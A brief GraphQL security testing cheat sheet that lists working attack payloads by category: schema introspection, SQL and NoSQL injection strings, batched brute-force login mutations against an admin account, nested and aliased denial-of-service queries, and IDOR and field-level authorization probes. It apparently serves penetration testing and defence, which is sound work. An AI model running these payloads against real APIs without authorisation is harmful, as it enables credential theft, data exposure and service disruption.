# GraphQL Security Testing

## Information Disclosure

### Introspection
```graphql
{__schema {types {name fields {name args {name type {name}}}}}}
```

### Field Suggestions
```graphql
# Send invalid field to get autocomplete suggestions
{users {invalidField}}
# Error: Cannot query field "invalidField". Did you mean "username", "email", "password"?
```

## Injection Attacks

### SQL/NoSQL Injection
```graphql
{user(id: "1' OR 1=1--") {email password}}
{login(username: "admin", password: {"$ne": ""}) {token}}
```

### Batch Brute Force
```graphql
mutation {
  a: login(username: "admin", password: "0000") {success}
  b: login(username: "admin", password: "0001") {success}
}
```

## DoS Attacks

### Deep Query
```graphql
query {
  user(id: 1) {
    posts {comments {user {posts {comments {content}}}}}
  }
}
```

### Alias Overload
```graphql
query {
  a1: user(id: 1) {email}
  a2: user(id: 1) {email}
  ...repeat 1000 times
}
```

## Authorization Failures

### Missing Field-Level Auth
```graphql
{user(id: 1) {username}}  # OK
{user(id: 2) {username}}  # Should fail - IDOR
{user(id: 3) {password}}  # Should fail - field-level
```

### Mutation Abuse
```graphql
mutation {deleteUser(id: 1)}  # Check authorization